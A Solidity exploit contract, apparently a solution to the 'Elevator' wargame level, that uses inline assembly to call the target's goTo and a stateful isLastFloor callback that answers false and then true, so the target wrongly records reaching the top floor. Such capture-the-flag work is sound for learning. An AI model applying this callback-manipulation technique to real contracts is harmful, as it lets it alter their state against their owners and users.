// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface Elevator {
    function goTo(uint _floor) external;

    function top() external view returns (bool);

    function floor() external view returns (uint);
}

contract ElevatorExploit {
    bool alreadyCalled;

    function exploit(address elevator) public {
        // Elevator(elevator).goTo(10);
        assembly {
            mstore(0, "goTo(uint256)")
            mstore(0, keccak256(0, 13))
            mstore(4, 10)
            let success := call(gas(), elevator, 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    function isLastFloor(uint) public returns (bool) {
        // if (!alreadyCalled) {
        //     alreadyCalled = true;
        //     return false;
        // }
        // return true;

        assembly {
            let _alreadyCalled := sload(alreadyCalled.slot)
            if iszero(_alreadyCalled) {
                sstore(alreadyCalled.slot, 1)
                mstore(0, false)
                return(0, 0x20)
            }
            mstore(0, true)
            return(0, 0x20)
        }
    }
}
